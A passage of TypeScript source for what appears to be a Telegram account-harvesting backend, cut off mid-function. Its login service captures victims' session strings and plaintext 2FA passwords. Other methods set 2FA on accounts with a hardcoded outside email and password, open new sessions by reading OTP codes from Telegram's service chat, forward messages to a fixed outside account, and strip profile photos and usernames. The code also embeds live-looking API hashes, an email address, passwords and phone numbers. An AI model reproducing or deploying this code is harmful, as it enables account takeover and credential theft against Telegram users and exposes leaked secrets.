// Skip the message and continue with the next one if there's any error\r\n                    continue;\r\n                }\r\n            }\r\n            if (!data.length) {\r\n                data.push({\r\n                    messageId: messages[messages.length - 1].id,\r\n                    mediaType: 'photo',\r\n                    thumb: null, // Convert to base64 for sending over HTTP, handle null\r\n                })\r\n            }\r\n            console.log(\"Returning \", data.length);\r\n\r\n            // Return the metadata and signal if we reached the end of messages\r\n            return { data, endOfMessages: false };\r\n\r\n        } catch (error) {\r\n            console.error('Error in getMediaMetadata:', error);\r\n            if (error.message.includes('FLOOD_WAIT')) {\r\n                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\\d+)/)[1], 10);\r\n                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);\r\n                // Handle flood wait, retry logic\r\n                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));\r\n                return this.getMediaMetadata(chatId, offset, limit); // Retry after waiting\r\n            }\r\n\r\n            throw new Error('Error fetching media metadata');\r\n        }\r\n    }\r\n\r\n    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {\r\n        try {\r\n            const messages = await this.client.getMessages(chatId, { ids: [messageId] });\r\n            const message = <Api.Message>messages[0];\r\n\r\n            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {\r\n                const media = message.media;\r\n                let contentType, filename, fileLocation;\r\n                const inputLocation = message.video || <Api.Photo>message.photo;\r\n\r\n                const data = {\r\n                    id: inputLocation.id,\r\n                    accessHash: inputLocation.accessHash,\r\n                    fileReference: inputLocation.fileReference,\r\n                };\r\n\r\n                if (media instanceof Api.MessageMediaPhoto) {\r\n                    contentType = 'image/jpeg';\r\n                    filename = 'photo.jpg';\r\n                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\r\n                } else if (media instanceof Api.MessageMediaDocument) {\r\n                    contentType = (media as any).mimeType || 'video/mp4';\r\n                    filename = 'video.mp4';\r\n                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\r\n                } else {\r\n                    return res.status(415).send('Unsupported media type');\r\n                }\r\n\r\n                res.setHeader('Content-Type', contentType);\r\n                res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\r\n\r\n                const chunkSize = 512 * 1024; // 512 KB chunks\r\n\r\n                for await (const chunk of this.client.iterDownload({\r\n                    file: fileLocation,\r\n                    offset: bigInt[0],\r\n                    limit: 5 * 1024 * 1024, // 80 MB limit\r\n                    requestSize: chunkSize,\r\n                })) {\r\n                    res.write(chunk); // Stream each chunk to the client\r\n                }\r\n                res.end();\r\n            } else {\r\n                res.status(404).send('Media not found');\r\n            }\r\n        } catch (error) {\r\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\r\n                return res.status(404).send('File reference expired');\r\n            }\r\n            console.error('Error downloading media:', error);\r\n            res.status(500).send('Error downloading media');\r\n        }\r\n    }\r\n\r\n\r\n\r\n    async forwardMessage(chatId: string, messageId: number) {\r\n        try {\r\n            await this.client.forwardMessages(\"@fuckyoubabie\", { fromPeer: chatId, messages: messageId })\r\n        } catch (error) {\r\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\r\n        }\r\n    }\r\n\r\n    async updateUsername(baseUsername) {\r\n        let newUserName = ''\r\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\r\n        let increment = 0;\r\n        if (username === '') {\r\n            try {\r\n                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                console.log(`Removed Username successfully.`);\r\n            } catch (error) {\r\n                console.log(error)\r\n            }\r\n        } else {\r\n            while (increment < 10) {\r\n                try {\r\n                    const result = await this.client.invoke(\r\n                        new Api.account.CheckUsername({ username })\r\n                    );\r\n                    console.log(result, \" - \", username)\r\n                    if (result) {\r\n                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                        console.log(`Username '${username}' updated successfully.`);\r\n                        newUserName = username\r\n                        break;\r\n                    } else {\r\n                        username = baseUsername + increment;\r\n                        increment++;\r\n                        await sleep(2000);\r\n                    }\r\n                } catch (error) {\r\n                    console.log(error.message)\r\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\r\n                        newUserName = username;\r\n                        break;\r\n                    }\r\n                    username = baseUsername + increment;\r\n                    increment++;\r\n                    await sleep(2000);\r\n                }\r\n            }\r\n        }\r\n        return newUserName;\r\n    }\r\n\r\n    async updatePrivacy() {\r\n        try {\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneCall(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Calls Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"PP Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyForwards(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"forwards Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Number Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"LAstSeen Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyAbout(),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n        }\r\n        catch (e) {\r\n            throw e\r\n        }\r\n    }\r\n    async getFileUrl(url: string, filename: string): Promise<string> {\r\n        const response = await axios.get(url, { responseType: 'stream' });\r\n        const filePath = `/tmp/${filename}`;\r\n        await new Promise((resolve, reject) => {\r\n            const writer = fs.createWriteStream(filePath);\r\n            response.data.pipe(writer);\r\n            writer.on('finish', () => resolve(true));\r\n            writer.on('error', reject);\r\n        });\r\n        return filePath;\r\n    }\r\n\r\n    async updateProfilePic(image) {\r\n        try {\r\n            const file = await this.client.uploadFile({\r\n                file: new CustomFile(\r\n                    'pic.jpg',\r\n                    fs.statSync(\r\n                        image\r\n                    ).size,\r\n                    image\r\n                ),\r\n                workers: 1,\r\n            });\r\n            console.log(\"file uploaded\")\r\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\r\n                file: file,\r\n            }));\r\n            console.log(\"profile pic updated\")\r\n        } catch (error) {\r\n            throw error\r\n        }\r\n    }\r\n\r\n    async hasPassword() {\r\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\r\n        return passwordInfo.hasPassword\r\n    }\r\n\r\n    async set2fa() {\r\n        if (!(await this.hasPassword())) {\r\n            console.log(\"Password Does not exist, Setting 2FA\");\r\n\r\n            const imapService = MailReader.getInstance();\r\n            const twoFaDetails = {\r\n                email: \"storeslaksmi@gmail.com\",\r\n                hint: \"password - India143\",\r\n                newPassword: \"Ajtdmwajt1@\",\r\n            };\r\n\r\n            try {\r\n                await imapService.connectToMail();\r\n                const checkMailInterval = setInterval(async () => {\r\n                    console.log(\"Checking if mail is ready\");\r\n\r\n                    if (imapService.isMailReady()) {\r\n                        clearInterval(checkMailInterval);\r\n                        console.log(\"Mail is ready, checking code!\");\r\n                        await this.client.updateTwoFaSettings({\r\n                            isCheckPassword: false,\r\n                            email: twoFaDetails.email,\r\n                            hint: twoFaDetails.hint,\r\n                            newPassword: twoFaDetails.newPassword,\r\n                            emailCodeCallback: async (length) => {\r\n                                console.log(\"Code sent\");\r\n                                return new Promise(async (resolve, reject) => {\r\n                                    let retry = 0;\r\n                                    const codeInterval = setInterval(async () => {\r\n                                        try {\r\n                                            console.log(\"Checking code\");\r\n                                            retry++;\r\n                                            if (imapService.isMailReady() && retry < 4) {\r\n                                                const code = await imapService.getCode();\r\n                                                console.log('Code:', code);\r\n                                                if (code) {\r\n                                                    await imapService.disconnectFromMail();\r\n                                                    clearInterval(codeInterval);\r\n                                                    resolve(code);\r\n                                                }\r\n                                            } else {\r\n                                                clearInterval(codeInterval);\r\n                                                await imapService.disconnectFromMail();\r\n                                                reject(new Error(\"Failed to retrieve code\"));\r\n                                            }\r\n                                        } catch (error) {\r\n                                            clearInterval(codeInterval);\r\n                                            await imapService.disconnectFromMail();\r\n                                            reject(error);\r\n                                        }\r\n                                    }, 10000);\r\n                                });\r\n                            },\r\n                            onEmailCodeError: (e) => {\r\n                                console.error('Email code error:', parseError(e));\r\n                                return Promise.resolve(\"error\");\r\n                            }\r\n                        });\r\n\r\n                        return twoFaDetails;\r\n                    } else {\r\n                        console.log(\"Mail not ready yet\");\r\n                    }\r\n                }, 5000);\r\n            } catch (e) {\r\n                console.error(\"Unable to connect to mail server:\", parseError(e));\r\n            }\r\n        } else {\r\n            console.log(\"Password already exists\");\r\n        }\r\n    }\r\n\r\n\r\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const filePath = await this.getFileUrl(url, filename);\r\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\r\n        await this.client.sendFile(id, { file, caption });\r\n    }\r\n\r\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\r\n        if (!this.client) throw new Error('Client is not initialized');\r\n        const filePath = await this.getFileUrl(url, filename);\r\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\r\n        await this.client.sendFile(id, { file, caption });\r\n    }\r\n\r\n    async deleteProfilePhotos() {\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.photos.GetUserPhotos({\r\n                    userId: \"me\"\r\n                })\r\n            );\r\n            console.log(`Profile Pics found: ${result.photos.length}`)\r\n            if (result && result.photos?.length > 0) {\r\n                const res = await this.client.invoke(\r\n                    new Api.photos.DeletePhotos({\r\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\r\n                    }))\r\n            }\r\n            console.log(\"Deleted profile Photos\");\r\n        } catch (error) {\r\n            throw error\r\n        }\r\n    }\r\n\r\n    async createNewSession(): Promise<string> {\r\n        const me = <Api.User>await this.client.getMe();\r\n        console.log(\"Phne:\", me.phone);\r\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\r\n            connectionRetries: 1,\r\n        });\r\n        await newClient.start({\r\n            phoneNumber: me.phone,\r\n            password: async () => \"Ajtdmwajt1@\",\r\n            phoneCode: async () => {\r\n                console.log('Waiting for the OTP code from chat ID 777000...');\r\n                return await this.waitForOtp();\r\n            },\r\n            onError: (err: any) => { throw err },\r\n\r\n        });\r\n\r\n        const session = <string><unknown>newClient.session.save();\r\n        await newClient.disconnect();\r\n        // await newClient.destroy();\r\n        console.log(\"New Session: \", session)\r\n        return session\r\n    }\r\n\r\n    async waitForOtp() {\r\n        for (let i = 0; i < 3; i++) {\r\n            try {\r\n                console.log(\"Attempt : \", i)\r\n                const messages = await this.client.getMessages('777000', { limit: 1 });\r\n                const message = messages[0];\r\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\r\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\r\n                    console.log(\"returning: \", code)\r\n                    return code;\r\n                } else {\r\n                    console.log(\"Message Date: \", new Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\r\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\r\n                    console.log(\"Skipped Code: \", code);\r\n                    if (i == 2) {\r\n                        return code;\r\n                    }\r\n                    await sleep(5000)\r\n                }\r\n            } catch (err) {\r\n                await sleep(2000)\r\n                console.log(err)\r\n            }\r\n        }\r\n    }\r\n}\r\nexport default TelegramManager;\r\n","import { ApiProperty } from \"@nestjs/swagger\";\r\n\r\nexport class AddContactDto {\r\n    @ApiProperty({\r\n        description: 'The mobile number of the user for authentication',\r\n        example: '+1234567890',\r\n    })\r\n    mobile: string;\r\n\r\n    @ApiProperty({\r\n        description: 'List of phone numbers to add as contacts',\r\n        type: Object,\r\n        example: [\r\n            {\r\n                mobile: '+1234567890',\r\n                tgId: \"1234567890\"\r\n            }\r\n        ],\r\n    })\r\n    data: { mobile: string, tgId: string }[];\r\n\r\n    @ApiProperty({\r\n        description: 'Prefix for automated contact names',\r\n        example: 'Contact',\r\n    })\r\n    prefix: string;\r\n}","import { ApiProperty } from \"@nestjs/swagger\";\r\n\r\nexport class AddContactsDto {\r\n    @ApiProperty({\r\n        description: 'The mobile number of the user for authentication',\r\n        example: '+1234567890',\r\n    })\r\n    mobile: string;\r\n\r\n    @ApiProperty({\r\n        description: 'List of phone numbers to add as contacts',\r\n        type: Object,\r\n        example: [\r\n            \"919892184284\", \"919967837841\", \"919972600626\",\r\n        ],\r\n    })\r\n    phoneNumbers: string[];\r\n\r\n    @ApiProperty({\r\n        description: 'Prefix for automated contact names',\r\n        example: 'Contact',\r\n    })\r\n    prefix: string;\r\n}","import { Module, forwardRef } from '@nestjs/common';\r\nimport { TgSignupController } from './tgSignup.controller';\r\n\r\n@Module({\r\n    imports: [],\r\n    controllers: [TgSignupController]\r\n})\r\nexport class TgSignupModule { }\r\n","import { Api } from \"telegram/tl\";\r\nimport { TelegramClient } from \"telegram\";\r\nimport { StringSession } from \"telegram/sessions\";\r\nimport axios from \"axios\";\r\nimport { sleep } from \"telegram/Helpers\";\r\nimport { computeCheck } from \"telegram/Password\";\r\nimport bigInt from \"big-integer\";\r\nimport { LogLevel } from \"telegram/extensions/Logger\";\r\nimport { parseError } from \"../../utils\";\r\nimport { BadRequestException } from \"@nestjs/common\";\r\n\r\nconst clients = new Map();\r\nlet creds = [\r\n    {\r\n        apiId: 27919939,\r\n        apiHash: \"5ed3834e741b57a560076a1d38d2fa94\"\r\n    },\r\n    {\r\n        apiId: 25328268,\r\n        apiHash: \"b4e654dd2a051930d0a30bb2add80d09\"\r\n    },\r\n    {\r\n        apiId: 2899,\r\n        apiHash: \"36722c72256a24c1225de00eb6a1ca74\"\r\n    },\r\n    {\r\n        apiId: 24559917,\r\n        apiHash: \"702294de6c08f4fd8c94c3141e0cebfb\"\r\n    },\r\n    {\r\n        apiId: 12777557,\r\n        apiHash: \"05054fc7885dcfa18eb7432865ea3500\"\r\n    },\r\n    {\r\n        apiId: 27565391,\r\n        apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\"\r\n    },\r\n    // {\r\n    //     apiId: 23195238,\r\n    //     apiHash: \"15a8b085da74163f158eabc71c55b000\"\r\n    // },\r\n    {\r\n        apiId: 27586636,\r\n        apiHash: \"f020539b6bb5b945186d39b3ff1dd998\"\r\n    },\r\n    {\r\n        apiId: 29210552,\r\n        apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\"\r\n    }\r\n]\r\n\r\n// const apiId = 24559917 || parseInt(process.env.API_ID);\r\n// const apiHash = \"702294de6c08f4fd8c94c3141e0cebfb\" || process.env.API_HASH;\r\n\r\nexport async function restAcc(phoneNumber) {\r\n    await sleep(1000);\r\n    console.log(\"Reset - \", phoneNumber);\r\n    const client: TgSignupService = getClient(phoneNumber)\r\n    if (client) {\r\n        await client.client?.destroy();\r\n        await client.client?.disconnect();\r\n        client.client.session.delete();\r\n        client.session.delete();\r\n        client.client._destroyed = true;\r\n        client.client = null;\r\n        delete client['client'];\r\n        await deleteClient(phoneNumber);\r\n    }\r\n}\r\n\r\nexport function getClient(number): TgSignupService {\r\n    return clients.get(number);\r\n}\r\n\r\nexport async function hasClient(number) {\r\n    return clients.has(number);\r\n}\r\n\r\nfunction contains(str, arr) {\r\n    return (arr.some(element => {\r\n        if (str?.includes(element)) {\r\n            return true;\r\n        }\r\n        return false;\r\n    }))\r\n};\r\n\r\nexport async function deleteClient(number) {\r\n    console.log(\"Deleting Client - \", number);\r\n    const cli = getClient(number);\r\n    await cli?.disconnect();\r\n    return clients.delete(number);\r\n}\r\n\r\nexport async function disconnectAll() {\r\n    for (const [phoneNumber, client] of clients.entries()) {\r\n        try {\r\n            await client?.disconnect();\r\n            clients.delete(phoneNumber);\r\n            console.log(`Client disconnected: ${phoneNumber}`);\r\n        } catch (error) {\r\n            console.log(error);\r\n            console.log(`Failed to Disconnect : ${phoneNumber}`);\r\n        }\r\n    }\r\n}\r\n\r\nexport async function createClient(number) {\r\n    try {\r\n        if (clients.has(number)) {\r\n            console.log(\"Client already exist\");\r\n            const cli: TgSignupService = clients.get(number);\r\n            setTimeout(async () => {\r\n                await restAcc(number)\r\n            }, 120000);\r\n            return (await cli.sendCode(false));\r\n        } else {\r\n            const randomIndex = Math.floor(Math.random() * creds.length);\r\n            const apiHash = creds[randomIndex].apiHash\r\n            const apiId = creds[randomIndex].apiId\r\n            console.log(\"Creating new client - \", number, creds[randomIndex]);\r\n            const cli = new TgSignupService(number, apiId, apiHash);\r\n            clients.set(number, cli);\r\n            await sleep(500)\r\n            return (await cli.sendCode(false));\r\n        }\r\n    } catch (error) {\r\n        console.log(parseError(error))\r\n        throw new BadRequestException(parseError(error).message)\r\n    }\r\n}\r\n\r\nexport class TgSignupService {\r\n    session: any;\r\n    phoneNumber: any;\r\n    client: TelegramClient;\r\n    phoneCodeHash: any;\r\n    apiId: number;\r\n    apiHash: string;\r\n    constructor(number: any, apiId: number, apiHash: string) {\r\n        this.apiId = apiId;\r\n        this.apiHash = apiHash;\r\n        this.phoneNumber = number;\r\n        this.session = new StringSession('');\r\n        this.client = null;\r\n        this.createClient();\r\n    }\r\n\r\n    async getLastActiveTime() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations());\r\n        let latest = 0\r\n        result.authorizations.map((auth) => {\r\n            if (!auth.country.toLowerCase().includes('singapore')) {\r\n                if (latest < auth.dateActive) {\r\n                    latest = auth.dateActive;\r\n                }\r\n            }\r\n        })\r\n        return latest\r\n    }\r\n\r\n    async disconnect() {\r\n        await this.client?.disconnect();\r\n        await this.client?.destroy();\r\n        await this.session.delete();\r\n        this.client = null\r\n    }\r\n\r\n    async createClient() {\r\n        try {\r\n            console.log(this.apiId, this.apiHash)\r\n            this.client = new TelegramClient(this.session, this.apiId, this.apiHash, {\r\n                connectionRetries: 5,\r\n            });\r\n            await this.client.setLogLevel(LogLevel.ERROR);\r\n            await this.client.connect();\r\n        } catch (error) {\r\n            console.log(\"Error while Connecting:\", error);\r\n        }\r\n    }\r\n\r\n    async deleteMessages() {\r\n        // console.log(\"IsConnected - \", this.client.connected, this.phoneNumber);\r\n        // if (this.client.connected) {\r\n        //     try {\r\n        //         const msgs = await this.client.getMessages(\"777000\", { limit: 10 });\r\n        //         const len = msgs['total'];\r\n        //         console.log(len)\r\n        //         for (let i = 0; i < len - 1; i++) {\r\n        //             console.log(msgs[i]?.text);\r\n        //             msgs[i]?.delete({ revoke: true });\r\n        //         }\r\n        //     } catch (error) {\r\n        //         console.log(\"Cannot delete Messages - \", this.phoneNumber);\r\n        //     }\r\n        // }\r\n        console.log(\"DeleteMessages TODO\")\r\n    }\r\n\r\n    async sendCode(\r\n        forceSMS = false\r\n    ): Promise<{\r\n        phoneCodeHash: string;\r\n        isCodeViaApp: boolean;\r\n    }> {\r\n        try {\r\n            await this.client.connect();\r\n            console.log(\"Sending OTP - \", this.phoneNumber, this.apiId, this.apiHash);\r\n            try {\r\n\r\n                const sendResult = await this.client.invoke(\r\n                    new Api.auth.SendCode({\r\n                        phoneNumber: `+${this.phoneNumber}`,\r\n                        apiId: this.apiId,\r\n                        apiHash: this.apiHash,\r\n                        settings: new Api.CodeSettings({}),\r\n                    })\r\n                );\r\n                console.log('Send result - ', sendResult);\r\n                setTimeout(async () => {\r\n                    await restAcc(this.phoneNumber);\r\n                }, 150000);\r\n                if (sendResult instanceof Api.auth.SentCodeSuccess)\r\n                    throw new Error(\"logged in right after sending the code\");\r\n                this.phoneCodeHash = sendResult.phoneCodeHash\r\n\r\n                if (!forceSMS || sendResult.type instanceof Api.auth.SentCodeTypeSms) {\r\n                    return {\r\n                        phoneCodeHash: sendResult.phoneCodeHash,\r\n                        isCodeViaApp:\r\n                            sendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n                    };\r\n                }\r\n\r\n                const resendResult = await this.client.invoke(\r\n                    new Api.auth.ResendCode({\r\n                        phoneNumber: `+${this.phoneNumber}`,\r\n                        phoneCodeHash: sendResult.phoneCodeHash,\r\n                    })\r\n                );\r\n                console.log('ReSend result - ', sendResult);\r\n                if (resendResult instanceof Api.auth.SentCodeSuccess)\r\n                    throw new Error(\"logged in right after resending the code\");\r\n\r\n                this.phoneCodeHash = resendResult.phoneCodeHash\r\n\r\n                return {\r\n                    phoneCodeHash: resendResult.phoneCodeHash,\r\n                    isCodeViaApp: resendResult.type instanceof Api.auth.SentCodeTypeApp,\r\n                };\r\n            } catch (sendCodeError) {\r\n                console.log(\"Error in sending code:\", sendCodeError);\r\n                // Handle the specific error or rethrow if needed\r\n                // Add additional handling or logging as necessary\r\n                throw sendCodeError; // Rethrow the error to the outer catch block\r\n            }\r\n        } catch (err: any) {\r\n            if (err.errorMessage === \"AUTH_RESTART\") {\r\n                try {\r\n                    return this.client.sendCode({ apiId: this.apiId, apiHash: this.apiHash }, `+${this.phoneNumber}`, forceSMS);\r\n                } catch (error) {\r\n                    console.log(\"heelo: \", error)\r\n                }\r\n            } else {\r\n                throw err\r\n            }\r\n        }\r\n    }\r\n\r\n    async login(phoneCode: any, passowrd?: any) {\r\n        let isRegistrationRequired = false\r\n        let termsOfService;\r\n        try {\r\n            if (!phoneCode) {\r\n                throw new Error(\"Code is empty\");\r\n            }\r\n            if (!this.client.connected) {\r\n                await this.client.connect();\r\n            }\r\n            const result = await this.client?.invoke(\r\n                new Api.auth.SignIn({\r\n                    phoneNumber: `+${this.phoneNumber}`,\r\n                    phoneCodeHash: this.phoneCodeHash,\r\n                    phoneCode\r\n                })\r\n            );\r\n            if (result instanceof Api.auth.AuthorizationSignUpRequired) {\r\n                isRegistrationRequired = true;\r\n                termsOfService = result.termsOfService;\r\n            } else {\r\n                await this.processLogin(result.user);\r\n                await restAcc(this.phoneNumber);\r\n                return { status: 200, message: \"Login success\" }\r\n            }\r\n        } catch (err: any) {\r\n            console.log(err);\r\n            if (err.errorMessage === \"SESSION_PASSWORD_NEEDED\") {\r\n                console.log(\"passowrd Required\")\r\n                try {\r\n                    const passwordSrpResult = await this.client.invoke(\r\n                        new Api.account.GetPassword()\r\n                    );\r\n                    const passwordSrpCheck = await computeCheck(\r\n                        passwordSrpResult,\r\n                        passowrd\r\n                    );\r\n                    const { user } = (await this.client.invoke(\r\n                        new Api.auth.CheckPassword({\r\n                            password: passwordSrpCheck,\r\n                        })\r\n                    )) as Api.auth.Authorization;\r\n\r\n                    this.processLogin(user, passowrd);\r\n                    return { status: 200, message: \"Login success\" }\r\n                } catch (error) {\r\n                    if (passowrd && passowrd !== '') {\r\n                        return { status: 400, message: \"Incorrect Password!<br/>Enter your telegram Two-Factor-Authentication password.\" }\r\n                    } else {\r\n                        return { status: 400, message: \"Telegram 2FA Password\" }\r\n                    }\r\n                }\r\n            } else {\r\n                const shouldWeStop = false//await authParams.onError(err);\r\n                if (shouldWeStop) {\r\n                    throw new Error(\"AUTH_USER_CANCEL\");\r\n                }\r\n            }\r\n            // await restAcc(this.phoneNumber);\r\n            return { status: 400, message: err.errorMessage }\r\n        }\r\n\r\n        if (isRegistrationRequired) {\r\n            try {\r\n                let lastName = 'last name';\r\n                let firstName = \"first name\";\r\n                const { user } = (await this.client.invoke(\r\n                    new Api.auth.SignUp({\r\n                        phoneNumber: `+${this.phoneNumber}`,\r\n                        phoneCodeHash: this.phoneCodeHash,\r\n                        firstName,\r\n                        lastName,\r\n                    })\r\n                )) as Api.auth.Authorization;\r\n\r\n                if (termsOfService) {\r\n                    // This is a violation of Telegram rules: the user should be presented with and accept TOS.\r\n                    await this.client.invoke(\r\n                        new Api.help.AcceptTermsOfService({\r\n                            id: termsOfService.id,\r\n                        })\r\n                    );\r\n                }\r\n\r\n                return user;\r\n            } catch (err: any) {\r\n                const shouldWeStop = false//await authParams.onError(err);\r\n                if (shouldWeStop) {\r\n                    throw new Error(\"AUTH_USER_CANCEL\");\r\n                }\r\n            }\r\n        }\r\n        // await restAcc(this.phoneNumber);\r\n    }\r\n\r\n    async getCallLogs() {\r\n        try {\r\n            const result: any = await this.client.invoke(\r\n                new Api.messages.Search({\r\n                    peer: new Api.InputPeerEmpty(),\r\n                    q: '',\r\n                    filter: new Api.InputMessagesFilterPhoneCalls({}),\r\n                    minDate: 0,\r\n                    maxDate: 0,\r\n                    offsetId: 0,\r\n                    addOffset: 0,\r\n                    limit: 100,\r\n                    maxId: 0,\r\n                    minId: 0,\r\n                    hash: bigInt.zero,\r\n                })\r\n            );\r\n            console.log(\"Got Messages\");\r\n\r\n            const callLogs = result.messages.filter(\r\n                message => message.action instanceof Api.MessageActionPhoneCall\r\n            );\r\n            console.log(\"filtered call logs\");\r\n\r\n            const filteredResults = {\r\n                outgoing: 0,\r\n                incoming: 0,\r\n                video: 0,\r\n                chatCallCounts: {},\r\n                totalCalls: 0\r\n            };\r\n\r\n            for (const log of callLogs) {\r\n                try {\r\n                    filteredResults.totalCalls++;\r\n                    const callInfo = {\r\n                        callId: log.action.callId.value,\r\n                        duration: log.action.duration,\r\n                        video: log.action.video,\r\n                        timestamp: log.date\r\n                    };\r\n                    console.log(callInfo);\r\n\r\n                    // Categorize by type\r\n                    if (log.out) {\r\n                        filteredResults.outgoing++;\r\n                    } else {\r\n                        filteredResults.incoming++;\r\n                    }\r\n\r\n                    if (log.action.video) {\r\n                        filteredResults.video++;\r\n                    }\r\n\r\n                    const chatId = log.peerId.userId.value;\r\n                    if (!filteredResults.chatCallCounts[chatId]) {\r\n                        console.log(\"Getting Enitity\", chatId)\r\n                        let ent = { firstName: 'Default', lastName: null };\r\n                        try {\r\n                            ent = <any>await this.client.getInputEntity(chatId);\r\n                            console.log(\"Got Enitity\", chatId)\r\n                        } catch (error) {\r\n                            console.log(\"Failed to get entity for chatId:\", chatId, error);\r\n                        }\r\n                        filteredResults.chatCallCounts[chatId] = {\r\n                            name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,\r\n                            count: 0\r\n                        };\r\n                    } else {\r\n                        console.log(chatId, ' Already exists');\r\n                    }\r\n                    filteredResults.chatCallCounts[chatId].count++;\r\n                } catch (error) {\r\n                    console.log(\"Error processing log:\", log, error);\r\n                }\r\n            }\r\n            console.log('Returning filtered results', filteredResults);\r\n            return filteredResults;\r\n        } catch (error) {\r\n            console.error(\"Error in getCallLogs:\", error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async processLogin(result, passowrd = undefined) {\r\n        console.log(this.client.session.save());\r\n        await this.client.getMe();\r\n        let photoCount = 0;\r\n        let videoCount = 0;\r\n        let movieCount = 0;\r\n        const sess = this.client.session.save() as unknown as string;\r\n        const user: any = await result.toJSON();\r\n        // const dialogs = await this.client?.getDialogs({ limit: 600 });\r\n        // const messageHistory = await this.client.getMessages(user.id, { limit: 200 }); // Adjust limit as needed\r\n        // for (const message of messageHistory) {\r\n        //     const text = message.text.toLocaleLowerCase();\r\n        //     if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {\r\n        //         movieCount++\r\n        //     } else {\r\n        //         if (message.photo) {\r\n        //             photoCount++;\r\n        //         } else if (message.video) {\r\n        //             videoCount++;\r\n        //         }\r\n        //     }\r\n        // }\r\n        // const exportedContacts: any = await this.client.invoke(new Api.contacts.GetContacts({\r\n        //     hash: bigInt.zero\r\n        // }));\r\n        let channels = 0;\r\n        const chatsArray = [];\r\n        let personalChats = 0;\r\n\r\n        // Process and format the exported contacts as needed\r\n        // const formattedContacts = exportedContacts.users.map(contact => ({\r\n        //     phone: contact.phone,\r\n        //     firstName: contact.firstName,\r\n        //     lastName: contact.lastName,\r\n        //     userName: contact.username,\r\n        //     clientId: contact.id.toString(),\r\n        //     fromId: user.id\r\n        // }));\r\n        console.log(\"AllGood\")\r\n        // for (let chat of dialogs) {\r\n        //     if (chat.isChannel || chat.isGroup) {\r\n        //         channels++;\r\n        //         const chatEntity: any = chat.entity.toJSON();\r\n        //         const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;\r\n        //         if (!chatEntity.broadcast && !cannotSendMsgs) {\r\n        //             chatsArray.push(chatEntity);\r\n        //         }\r\n        //     } else {\r\n        //         personalChats++;\r\n        //     }\r\n        // }\r\n        // const callLogs = await this.getCallLogs();\r\n\r\n\r\n        const payload3 = {\r\n            photoCount, videoCount, movieCount,\r\n            gender: null,//data?.data?.gender,\r\n            mobile: user.phone,\r\n            session: `${sess}`,\r\n            firstName: user.firstName,\r\n            lastName: user.lastName,\r\n            userName: user.username,\r\n            channels: channels,\r\n            personalChats: personalChats,\r\n            calls: {},//callLogs?.totalCalls > 0 ? callLogs : {},\r\n            contacts: 0,//exportedContacts.savedCount,\r\n            msgs: 0,//messageHistory.total,\r\n            totalChats: 0,//chats['total'],\r\n            lastActive: new Date().toISOString().split('T')[0],\r\n            tgId: user.id\r\n        };\r\n        if (passowrd) {\r\n            payload3['twoFA'] = true;\r\n            payload3['password'] = passowrd\r\n        }\r\n        